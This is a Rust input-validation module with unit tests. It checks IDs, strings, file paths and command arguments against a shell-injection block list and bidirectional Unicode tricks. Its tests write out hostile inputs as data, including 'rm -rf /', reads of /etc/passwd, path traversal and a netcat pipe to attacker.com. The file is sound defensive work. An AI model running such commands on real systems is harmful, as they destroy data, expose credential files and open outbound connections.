use crate::core::errors::{ValidationError, ValidationResult};
use std::path::{Path, PathBuf};

/// Comprehensive validation for external data sources
pub struct Validator;

impl Validator {
    /// Validate vendor ID (must be between 1 and 65535)
    pub fn validate_vendor_id(vendor_id: u16) -> ValidationResult<()> {
        if vendor_id == 0 {
            return Err(ValidationError::OutOfRange {
                field: "vendor_id".to_string(),
                value: vendor_id as i64,
                min: 1,
                max: 65535,
            });
        }

        // Check for suspicious vendor IDs (potential attack vectors)
        if Self::is_suspicious_vendor_id(vendor_id) {
            return Err(ValidationError::InvalidField {
                field: "vendor_id".to_string(),
                reason: "Vendor ID is in suspicious range".to_string(),
            });
        }

        Ok(())
    }

    /// Validate product ID (must be between 1 and 65535)
    pub fn validate_product_id(product_id: u16) -> ValidationResult<()> {
        if product_id == 0 {
            return Err(ValidationError::OutOfRange {
                field: "product_id".to_string(),
                value: product_id as i64,
                min: 1,
                max: 65535,
            });
        }

        Ok(())
    }

    /// Validate string fields with comprehensive checks
    pub fn validate_string_field(
        field_name: &str,
        value: &str,
        max_length: Option<usize>,
    ) -> ValidationResult<()> {
        // Check for empty values
        if value.is_empty() {
            return Err(ValidationError::EmptyValue {
                field: field_name.to_string(),
            });
        }

        // Check length constraints
        if let Some(max_len) = max_length {
            if value.len() > max_len {
                return Err(ValidationError::StringTooLong { max: max_len });
            }
        }

        // Check for null bytes and control characters
        if let Some(pos) = Self::find_invalid_byte_sequence(value) {
            return Err(ValidationError::InvalidStringBytes {
                value: value.to_string(),
                pos,
            });
        }

        Ok(())
    }

    /// Validate application class specifically
    pub fn validate_app_class(app_class: &str) -> ValidationResult<()> {
        Self::validate_string_field("app_class", app_class, Some(256))?;

        // Additional app-class specific validation
        if app_class.contains(char::from(0x1D)) {
            return Err(ValidationError::InvalidField {
                field: "app_class".to_string(),
                reason: "Contains field separator character".to_string(),
            });
        }

        Ok(())
    }

    /// Validate window title specifically
    pub fn validate_window_title(title: &str) -> ValidationResult<()> {
        Self::validate_string_field("title", title, Some(1024))?;
        Ok(())
    }

    /// Validate file path with security checks
    pub fn validate_file_path(path: &str, allowed_dirs: &[PathBuf]) -> ValidationResult<()> {
        let path = Path::new(path);

        // Check for path traversal attempts
        if Self::contains_path_traversal(path) {
            return Err(ValidationError::InvalidPathSequence {
                path: path.to_string_lossy().to_string(),
                sequence: "path traversal detected".to_string(),
            });
        }

        // Canonicalize path to resolve symlinks and relative paths
        let canonical_path = match path.canonicalize() {
            Ok(p) => p,
            Err(_) => {
                return Err(ValidationError::InvalidField {
                    field: "path".to_string(),
                    reason: "Cannot canonicalize path".to_string(),
                });
            }
        };

        // Check if path is within allowed directories
        if !Self::is_path_allowed(&canonical_path, allowed_dirs) {
            return Err(ValidationError::InvalidPathSequence {
                path: path.to_string_lossy().to_string(),
                sequence: "path outside allowed directories".to_string(),
            });
        }

        Ok(())
    }

    /// Validate TOML configuration size (DoS protection)
    pub fn validate_config_size(content: &str, max_size: usize) -> ValidationResult<()> {
        if content.len() > max_size {
            return Err(ValidationError::StringTooLong { max: max_size });
        }
        Ok(())
    }

    /// Validate command arguments for injection prevention
    pub fn validate_command_args(args: &[String]) -> ValidationResult<()> {
        const INJECTION_PATTERNS: &[&str] = &[
            ";", "&&", "||", "|", "`", "$(", "${",
            "../", "..\\", "\x00", "\n", "\r", "\"", "'",
            "&", "<", ">", ">>", "<<",
        ];

        for (arg_index, arg) in args.iter().enumerate() {
            // Check total argument length (DoS protection)
            if arg.len() > 4096 {
                return Err(ValidationError::InvalidField {
                    field: format!("arg_{}", arg_index),
                    reason: "Argument too long".to_string(),
                });
            }

            // Check for injection patterns
            for pattern in INJECTION_PATTERNS {
                if arg.contains(pattern) {
                    return Err(ValidationError::InvalidField {
                        field: format!("arg_{}", arg_index),
                        reason: format!("Contains injection pattern: {}", pattern),
                    });
                }
            }

            // Check for suspicious unicode sequences
            if Self::contains_suspicious_unicode(arg) {
                return Err(ValidationError::InvalidField {
                    field: format!("arg_{}", arg_index),
                    reason: "Contains suspicious unicode sequences".to_string(),
                });
            }
        }

        Ok(())
    }

    // Private helper methods

    /// Check for suspicious vendor IDs that might be attack vectors
    fn is_suspicious_vendor_id(vendor_id: u16) -> bool {
        // Known attack patterns or reserved ranges
        const SUSPICIOUS_RANGES: &[(u16, u16)] = &[
            (0x0000, 0x0000), // Invalid
            (0xFFFF, 0xFFFF), // Broadcast/reserved
            (0xFEFF, 0xFEFF), // Byte order mark
        ];

        for (start, end) in SUSPICIOUS_RANGES {
            if vendor_id >= *start && vendor_id <= *end {
                return true;
            }
        }

        false
    }

    /// Find invalid byte sequences in strings
    fn find_invalid_byte_sequence(s: &str) -> Option<usize> {
        for (pos, byte) in s.bytes().enumerate() {
            // Control characters (except common whitespace)
            if byte < 0x20 && byte != b'\t' && byte != b'\n' && byte != b'\r' {
                return Some(pos);
            }

            // Null bytes
            if byte == 0 {
                return Some(pos);
            }

            // DEL character
            if byte == 0x7F {
                return Some(pos);
            }
        }

        None
    }

    /// Check for path traversal attempts
    fn contains_path_traversal(path: &Path) -> bool {
        let path_str = path.to_string_lossy();
        path_str.contains("../") ||
        path_str.contains("..\\") ||
        path_str.starts_with("..") ||
        path_str.contains("\\..\\")
    }

    /// Check if canonicalized path is within allowed directories
    fn is_path_allowed(canonical_path: &Path, allowed_dirs: &[PathBuf]) -> bool {
        allowed_dirs.iter().any(|allowed_dir| {
            canonical_path.starts_with(allowed_dir)
        })
    }

    /// Check for suspicious unicode sequences
    fn contains_suspicious_unicode(s: &str) -> bool {
        // Check for right-to-left override and other suspicious unicode
        const SUSPICIOUS_UNICODE: &[char] = &[
            '\u{202E}', // Right-to-left override
            '\u{200E}', // Left-to-right mark
            '\u{200F}', // Right-to-left mark
            '\u{202A}', // Left-to-right embedding
            '\u{202B}', // Right-to-left embedding
            '\u{202D}', // Left-to-right override
            '\u{2066}', // Left-to-right isolate
            '\u{2067}', // Right-to-left isolate
            '\u{2069}', // Pop directional isolate
        ];

        SUSPICIOUS_UNICODE.iter().any(|&c| s.contains(c))
    }
}

/// Trait for validatable types
pub trait Validatable {
    fn validate(&self) -> ValidationResult<()>;
    fn validation_context(&self) -> crate::core::errors::ErrorContext;
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_vendor_id_validation() {
        // Valid vendor IDs
        assert!(Validator::validate_vendor_id(1).is_ok());
        assert!(Validator::validate_vendor_id(0xFEED).is_ok());
        assert!(Validator::validate_vendor_id(65535).is_ok());

        // Invalid vendor IDs
        assert!(Validator::validate_vendor_id(0).is_err());
    }

    #[test]
    fn test_string_validation() {
        // Valid strings
        assert!(Validator::validate_string_field("test", "hello", None).is_ok());
        assert!(Validator::validate_string_field("test", "hello world", Some(20)).is_ok());

        // Invalid strings
        assert!(Validator::validate_string_field("test", "", None).is_err());
        assert!(Validator::validate_string_field("test", "hello", Some(3)).is_err());
        assert!(Validator::validate_string_field("test", "hello\x00world", None).is_err());
        assert!(Validator::validate_string_field("test", "hello\x01world", None).is_err());
    }

    #[test]
    fn test_app_class_validation() {
        // Valid app classes
        assert!(Validator::validate_app_class("Firefox").is_ok());
        assert!(Validator::validate_app_class("com.example.app").is_ok());

        // Invalid app classes
        assert!(Validator::validate_app_class("").is_err());
        assert!(Validator::validate_app_class("app\x1dclass").is_err()); // Contains separator
        assert!(Validator::validate_app_class("a".repeat(300).as_str()).is_err()); // Too long
    }

    #[test]
    fn test_path_validation() {
        let allowed_dirs = vec![
            PathBuf::from("/home/user"),
            PathBuf::from("/tmp/allowed"),
        ];

        // Valid paths
        assert!(Validator::validate_file_path("/home/user/config.toml", &allowed_dirs).is_ok());
        assert!(Validator::validate_file_path("./config", &allowed_dirs).is_ok());

        // Invalid paths
        assert!(Validator::validate_file_path("../../../etc/passwd", &allowed_dirs).is_err());
        assert!(Validator::validate_file_path("/etc/passwd", &allowed_dirs).is_err());
        assert!(Validator::validate_file_path("/home/user/../../etc/passwd", &allowed_dirs).is_err());
    }

    #[test]
    fn test_command_args_validation() {
        // Valid arguments
        assert!(Validator::validate_command_args(&["config.json".to_string(), "verbose".to_string()]).is_ok());

        // Invalid arguments
        assert!(Validator::validate_command_args(&["; rm -rf /".to_string()]).is_err());
        assert!(Validator::validate_command_args(&["&& cat /etc/passwd".to_string()]).is_err());
        assert!(Validator::validate_command_args(&["| nc attacker.com 4444".to_string()]).is_err());
        assert!(Validator::validate_command_args(&["$(whoami)".to_string()]).is_err());
        assert!(Validator::validate_command_args(&["../../../etc/passwd".to_string()]).is_err());
    }

    #[test]
    fn test_config_size_validation() {
        // Valid size
        assert!(Validator::validate_config_size("small config", 100).is_ok());

        // Invalid size
        assert!(Validator::validate_config_size(&"x".repeat(101), 100).is_err());
    }
}